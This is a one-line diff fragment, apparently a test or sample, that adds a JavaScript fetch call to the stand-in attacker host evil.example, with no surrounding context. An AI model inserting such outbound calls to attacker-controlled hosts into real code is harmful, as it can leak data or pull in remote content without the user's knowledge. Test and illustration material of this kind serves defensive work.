@@ -1,0 +1,1 @@
+fetch("//evil.example/x")
